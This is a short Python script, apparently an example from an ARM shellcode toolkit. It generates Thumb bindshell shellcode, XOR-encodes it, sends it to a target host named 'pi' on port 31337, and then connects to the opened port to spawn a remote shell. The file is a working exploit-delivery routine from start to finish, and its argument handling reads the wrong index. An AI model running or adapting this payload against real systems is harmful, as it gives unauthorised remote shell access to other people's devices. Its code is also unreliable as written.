#!python

from TesterModule import *
import sys

HOST = 'pi'
PORT = 31337

def Run(argv):
    """Bindshell shellcode example

    Args: 
        argv(list): arugment(s)
    """
    if len(argv) > 0:
        u16Port = argv[1]
    else:
        u16Port = 1337

    # ARMSCGen Thumb Class
    scgen = thumbSCGen()
    
    # generates bindshell with options
    #   u16Port(int): specific port
    #   sock(int/str/reg): connection sock will be mapped with shell
    #   once(boolean): binds on port infinity if true
    #                  binds on port once if false
    scode = scgen.bindshell(u16Port, sock='r6', once=False)

    # compiles shellcode
    scode_binary = CompileSC(scode, isThumb=True)

    # make an encoder with XOR key and compiles
    xor_encoder_with_scode_binary = MakeXorShellcode( scode_binary )

    # make a socket and a file
    (s, f) = makeSocket(HOST, PORT)

    # sends/writes a shellcode
    f.write(xor_encoder_with_scode_binary + '\n')

    (s2, f2) = makeSocket(HOST, u16Port)
    spawnAShell(s2)

    print scode

if __name__ == '__main__':
    Run(sys.argv[1:])
